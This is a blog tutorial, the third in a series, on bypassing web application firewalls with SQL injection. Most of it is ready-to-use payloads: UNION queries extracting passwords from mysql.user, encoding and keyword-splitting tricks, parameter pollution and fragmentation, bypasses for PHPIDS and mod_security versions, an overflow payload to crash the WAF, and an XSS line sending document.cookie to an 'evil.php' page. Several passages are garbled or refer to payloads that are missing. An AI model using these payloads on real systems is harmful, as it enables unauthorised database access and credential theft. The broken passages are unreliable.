---
title: 'Web Application Firewall Bypassing - #3'
permalink: web-application-firewall-bypassing-3
description: Hello again! Today, in Chapter 3 of our WAF Bypassing series, I will
  take you on a very long adventure, starting with SQL Injection. The subject of my
  article is What is SQL Inj? Since it is not, I will not process these definition
  parts. In addition, I will quickly move on to the subject in order to be a continuation
  of the next chapter. Have a good read so far.
tags:
- cyber
- security
- web
- application
- firewall
- bypassing
---

<img src="/images/bypss3.png">

> Hello again! Today, in Chapter 3 of our WAF Bypassing series, I will take you on a very long adventure, starting with SQL Injection. The subject of my article is What is SQL Inj? Since it is not, I will not process these definition parts. In addition, I will quickly move on to the subject in order to be a continuation of the next chapter. Have a good read so far. [Türkçe versiyonu için tıklayınız.](/tr/web-guvenlik-duvarlarini-bypasslamak-3/)

### Bypassing WAF with SQL Injection
```
‘ uni<on sel<ect password from mySQL.user limit 1 /*
```
As we have seen before, there is a waf filter. However, if we identify a character that is blocked by WAF, we can use it to our advantage. In MySQL databases, the function of char() is used to replace English character variables. For example, let's take an example that we can use by making use of DVWA.

```
‘ UNION select table_schema,table_name FROM information_Schema.tables where table_schema = “dvwa” -
```
As in our example, the result of encoding texts with character encoding is as follows in our example:
```
‘ UNION select table_schema,table_name FROM information_Schema.tables where table_schema =char(100,118,119,97) -
```
  As you can see, we replaced 'dvwa' with MySQL's char() function, char(100,112,119,97), which uses ASCII codes in it, and injected the filtered data into the database many times without using quotes. WAFs work with char() as well as almost any other database. But sometimes only characters can be kept at a time, For example, char(0x##)+char(0x##)+… so the only way is to try others if it doesn't work for us.
 
  Here we have performed our first bypass standing up. So how did it happen? Very simple. We encoded the text 'dvwa' on DVWA. Because the quotation mark was the forbidden character. And we surpassed it.<br><br>
### Change Keyword
Most of the time examples that keywords are blocked come to the filtering stage after passing the query, and then it combines the data from the beginning and the end so that the middle keyword is deleted. And creates a new keyword to be executed on the server. They work with layer logic. It is a difficult subject to explain. But I will explain it as clearly as I can. Let's continue with our SQL example.

```
‘ union selselectect password from mySQL.user limit 1 /*
```

We are currently reviewing a sample filter that WAF blocks the 'select' keyword. After the query request is accepted and then filtered, the middle keyword 'select' will be deleted and create a new keyword 'select'.<br>

With concatenation in strings, we can split the SQL keyword and bypass the WAF filters. The join syntax may vary by the database engine. For example in an MsSQL database, the select 1 command can change using join.

It's one of the effective ways to bypass WAFs, like the examples I wrote.<br>

Oftentimes, WAF filters cannot filter out a malicious keyword from a supplied query if the filters WAFs use have case-sensitive keywords. For example, if select can block upper and lower case letters to the database, but only does these checks, then providing a value such as SeLeCt will not be blocked and will bypass the WAF. This applies to XSS attacks and can be used as follows.<br>

```
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
```

As I said at the beginning of this chapter, there are many layers that can exist until our code achieves its goal. So far, we've looked at the only ways to encode strings. But we will have to write a lot of WAFs and a lot of code in chain form.

Now let's consider a scenario where the web server decodes the URL, but the WAFs also encode the URL for security purposes. The SQL sample code this time is as follows.

```
%2527%2520union%2520select%2520password%2520from%2520mySQL.user%2520limit%25201%2520%2F*
```

In this string code, the URL is encoded the same as in our encode example, but in the same way. In this case, when the WAF decodes this string, it cannot block it because it is still encoded and cannot find the malicious code. In the web server phase, the string will be decoded again and will work correctly. In short, our Bypass code will fulfill its function. So let's move on.<br><br>

### Bypassing WAF with SQL Injection
Until now, most of our examples were using SQL queries for WAF Bypassing. This is because the most common attack used in WAF bypassing is SQL Inj. that is. But let's start with SQL itself. SQL (short for Structured Query Language) is a query language used in the design and management of databases. Most of the products used today are relational databases such as SQL Server, MySQL, and others. Databases have data stored in a table-like structure with rows and columns.

Queries that you may have seen many times in this series are strings that retrieve data from the database at the client's call, using the 'select' statement. Apart from Select, there are some other expressions mostly used in SQL Injection and they are:

* **INSERT**: The INSERT statement is used to create a new row of data within a table. Typically used when an application adds a new entry to an audit log, creates a new user account, or creates a new order.

* **UPDATE**: The UPDATE statement is used to replace one or more rows of data in a table. It is often used in functions where a user modifies the value of data that already exists in the database.

* **DELETE**: The DELETE statement is used to delete one or more rows of data in a database table.

There is another common feature commonly used in SQL injection attacks: the UNION operator. Used to combine the results of two or more SELECT statements into a single result. So, when a client application makes a query to retrieve some data from the server, the UNION operator can be used to add another SELECT statement and have both select statements executed in the database. For example, let's take the following query:

```
SELECT * FROM users WHERE fname='Tom'
```

Here the query is invoked to return all records from table users whose 'fname' field is equal to Tom. (The * character is a wildcard in SQL and selects all columns in a table) Now, using the UNION operator in this query is quite simple:

```
SELECT * FROM users WHERE fname='Tom' UNION SELECT password FROM users -'
```
Here the query does everything it did before and adds the records of the passwords row in the user's table to the results. So by supplying this UNION operator in a vulnerable web application that already supplies a query to the database, you can understand that it will add the query we choose to this "equation". Now let's see what exactly SQL Injection is and how we can use it in WAF Bypassing.<br>

SQL Injection is a code injection attack in which the attacker provides a maliciously crafted query to the database for data extraction purposes. Despite being one of the older ones, it's a really common vulnerability. To see how this vulnerability works, consider a search field on a website where we give a name and information about the corresponding name. The database executes the following query:

```
SELECT * FROM users WHERE name='tom';
```
If this database is vulnerable and we throw an 'error' we will have the following results in the query:
```
SELECT * FROM users WHERE name=''';
```
An example attack, in this case, would be:
```
SELECT * FROM users WHERE name = 'tom' OR '1'='1' — ';
```
Here we've provided tom 'OR' 1 '=' 1' - which always results in a logical expression that results in True, because with 1 = 1 and the or operator each time, we only need one of the two to be true in the query to return everything in the user's table. Double quotes are added so that everything after them is interpreted and not executed.<br>

Blind SQL Injection is the most common type of SQL injection and differs from a simple one in that the results of this type of injection are invisible to the attacker. The page will not display the results as in the previous example but will show them based on the logical expression results that will be generated from our injection. This is a difficult vulnerability to exploit as it takes time to test many things one by one and most will be failed requests. Let's take the previous example with the name search field. In such a case, which is most common in penetration testing, the query takes place entirely on the server; we don't know the names or query strings of the database, table, or fields. In this case, the simple 1 = 1 we provided earlier will give us no results,<br>

Here both Boolean expressions must be true, tom must equal a record in the database, and 1 = 1 must be true, which always happens. If this returns a result, it means that it is vulnerable to Blind SQL Injection and we can proceed to fingerprint the database.

If we need a good example of how to proceed, it is here;
```
Tom' AND substring(@@version, 1, 1)=5
```
The quotation mark will give us the bottom “substring(@@version, 1, 1)=5” section and check if the MySQL version is version 5 (with the “= 5” check) and if version 5 is running then the page will load normally because SQL will work fine. And this is the way of blind SQL injection. We must provide queries to the database that if true, the page corresponding to the first part of the string we supplied will be loaded.<br>

These types of attacks are tested many times by automated tools like sqlmap, but be careful because such tools are really noisy and can cause a lot of unnecessary reports in the database you are testing, there is a very good chance that you will encounter something you definitely don't want.<br>

Finally, after the MySQL fingerprint example we saw, there is another similar way to find and fingerprint an Oracle-based database by sending the following query to the database:<br>
```
SELECT banner FROM v$version WHERE rownum=1
```
In such cases, we not only get information about the database software, but also details about the version are returned, so there is no way to check for a specific version, but we can just provide the @@ version in the query. for MySQL. If the underlying database is out of date, new attack vectors such as buffer overflows can be investigated and implemented. It is also possible to exploit the vulnerability with the Blind-SQL Injection method, by replacing the SQL functions that reach the WAF filter rules with their synonyms. For example:
```
* substring() -> mid(), substr(), etc * ascii() -> hex(), bin(), etc
```

Now let's see some examples of filter rule bypass on WAF with SQL Injection.<br><br>

### Bypassing WAF Filters with SQL Injection

As we said, filter rules are the main aspect of a WAF's security and if a server we want to scan has a WAF in front of it, we should be able to bypass them. Now let's say we are testing http://target.com/?id=1 with parameter ?id=1 and it looks vulnerable according to our basic steps. The first way to provide a query that gives us the filtering rule is a simple method like this:
 ```
/?id=1+union+(select+*+from+users)
 ```
Here without encoding the query is normal and WAF detects it immediately and blocks us. Now, as we saw earlier, there are many ways to bypass these rules, so let's examine some examples:
 ```
/?id=(1)union(select(1),mid(hash,1,32)from(users))
 ```
In this case, we replace substring() with mid(), which can have positive results, as most WAFs only filter a small amount of function.
 ```
/?id=1+union+(select’1',concat(login,hash)from+passwords)
 ```
Here we concatenate our array with the concat() function, this can help us in cases where WAF is filtering the whole query. By combining it, we are confident that our query will not be blocked by such filters.
 ```
/?id=(1)union(((((((select(*),hex(hash)from(passwords)))))))))
 ```
Most WAFs only filter one bracket layer, so an effective way to bypass it is to add more layers to trick the WAF into thinking there is nothing malicious inside the bracket.

Let's see some real-world filter bypassing examples for WAFs used in the industry.
<br><br>

### PHPIDS - PHP Intrusion Detection System

PHPIDS (PHP Intrusion Detection System) is an open-source PHP Web Application Intrusion Detection System. It is widely known and used by its nature and you can find it on many web servers. PHPIDS has some default filter rules that you can find on GitHub. Now let's perform our first attack on a system using a MySQL database:
```
/?id=1+union+select+user,password+from+mysql.user+where+user=1
```
By providing this, the WAF blocks us, because as you can see, it's pretty obvious that we're providing a SQL query. Let's change this query like this:
```
/?id=1+union+select+user,password+from+mysql.user+limit+0.1
```
Here you can see that we have replaced Where user = 1 with the limit expression, which is used to retrieve records from one or more tables in a database and limit the number of records returned by a limit value. So even if we don't know the rule and change the query like this, we now know one of the rules.

Continuing, let's give a really simple yet powerful query we saw earlier, 1 OR 1 = 1

Here we see WAF blocking us and it is normal as it is a fairly standard and well-known malicious query. However, bypassing is also quite easy. To bypass the WAF and reach the target SQL database, we need to replace the numbers with their hexadecimal equivalents:

Finally, in PHPIDS version 0.6.1.1 that we checked, a bypass similar to the one we saw before happens, and if we replace substring() with mid() we can bypass the firewall.

In version 2.5.9 of mod_security, we have many filters that can be bypassed. The two most common ones we've seen again so far are the substring -- middle change and the hexadecimal encoding of 1 = 1. We can also replace 1 = 2 with:

This will bypass the filter correctly. Also, this WAF filters the drop expression, which we can replace with this.

### HPP Exploiting with SQL Injection
We talked about HTTP Head at the beginning of this post, and now that we have an idea about SQL Injection attacks, let's combine them to take advantage of HPP. We should start by saying that the success of an HPP attack depends on the environment of the application we are attacking. Now, the logic behind this hack is that we can break a query into many parts by adding parameters. For example:

```
http://target.com/?id="queryquery1"&id="queryquery2"
```

In the final destination, if the website has HPP Vulnerability, this query will be merged and executed by the server. This vulnerability will look like this in the SQL request code that a web application makes:
```
SQL="select key from table where id="+Request.QueryString("id")
```
And it can be exploited by the logic we saw earlier;
```
/?id=1/**/union/*&id=*/select/*&id=*/tom/*&id=*/from/*&id=*/users
```
As you can tell, we used many &id parameters to combine the query and SQL annotations to interpret these parameters in the final SQL server target. With this technique, only the query to be executed remains at the end. So when we combine the code that the form executes and the query we provide in the parameter, it selects the key from the table.<br><br>

### Splitting the HTTP Parameter
HTTP Parameter fragmentation is similar to HPP, but we don't use the same parameter over and over. In HPF, we attack web pages with multiple parameters, and the SQL query we are trying to inject is split into as many parts as the number of parameters available. An example of vulnerable code would be:
```
Query(“select * from table where a=".$_GET['a']." and b=".$_GET['b']);
```
```
Query(“select * from table where a=".$_GET['a'].” and b=".$_GET['b'].” limit
```
As you can see, this page generates a query with two parameters, a and b, and sends both to the server. By providing:

We interpret all the queries below after they are injected, and this request does not allow anyone to perform the attack, because we can see that in the vulnerable code it has the AND operator, so it needs both parameters.

To use the code like this, we can change our previous query like this:
```
/?a=1+union/*&b=*/select+1,2
```
Here you can see that we are splitting the query in both parameters so the code is True since both parameters are present and we add the SQL comment in the right places so the parameters are interpreted at the end, and the query will be combined into one piece. The final query from the first vulnerable code would be:
```
select * from table where a=1 union/* and b=*/select 1,2
```
Another example with more than two parameters would be:
```
/?a=1+union/*&b=*/select+1,password/*&c=*/from+users-
```
The same is true here, for three-part fragmentation, because we have three parameters. In this case the final SQL parameter would be:
```
select * from table where a=1 union/* and b=*/select 1,pass/*limit */from users
```

We talked about normalization many times in the previous examples without really mentioning it. Normalization is the process of adding the comments and other symbols that the WAF extracts into the keywords that the WAF also extracts, so the end result will be our desired query that we want executed in the database. This is a really good WAF bypass method, but we need to know some of the filters the WAF uses in the attack to be successful.

In the example we saw earlier, due to filtering from WAF (/? A = 1 + union + select + 1,2 /*), which does not allow anyone to attack, we can add the following;
```
/?a=1/*union*/union/*select*/select+1.2/*
```
If there is a corresponding vulnerability here in the WAF, this request will be successfully executed on the server. Once processed by the WAF, the request will become:
```
?a=1/*uniX on*/union/*sel X ect*/select+1.2/*
```
This example will work if the dangerous traffic is cleared by the WAF, not if the entire request or source of the attack is blocked. Similarly, the following request does not allow anyone to perform this query:
```
/?id=1+union+select+1,2,3/*
```
But if we change it to something like this and it's vulnerable to WAF normalization techniques:
```
/?id=1+un/**/ion+sel/**/ect+1,2,3-
```
This query will be executed entirely in the SQL database and will look something like this:
```
SELECT * from table where id =1 union select 1,2,3-
```
This example works in case of excessive cleaning of incoming data (replacing regular expression with empty string). As you can see, instead of the / ** / comment symbol, any string of symbols that WAF cuts can be used (for example, #### #, % 00 ), but we need to know and we can find it, of course, by fingerprinting the WAF's filter rules. <br><br>

### BufferOwerflow + SQL Injection = WAF Bypassing

For those who don't know, "a buffer overflow or buffer overflow is an anomaly in which a program, when writing data to a memory, exceeds the memory limit and overwrites adjacent memory locations." We can exploit this vulnerability found in some WAFs with custom coding history.
<br><br>
<p align="center">
<img src="/images/diagram.png">
</p>

For example, many firewalls are written in C or C++, which can crash with a buffer overflow because some of the program's variables can only take up a small amount of memory and we can bypass it if there is no protection or bad coding. .

Let's get a website again and provide the following link:
```
http://www.target.com/?id=-15+and+(select 1)=(Select 0xAA[..(1000“A”)..])+/*!uNIOn*/+/*!SeLECt */+1,2
```
With this method, first, the WAF crashes and then the SQL query comes to the server and is executed. We can also test if the firewall is down by providing:
```
http://www.target.com/ id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/* nnaa*/+1,2
```
If it returns a 500 HTTP responses, that means we can exploit the WAF with buffer overflow.

Unfortunately, after a long and tiring break, we say goodbye for today. Hope to see you in the 4th article of the series.
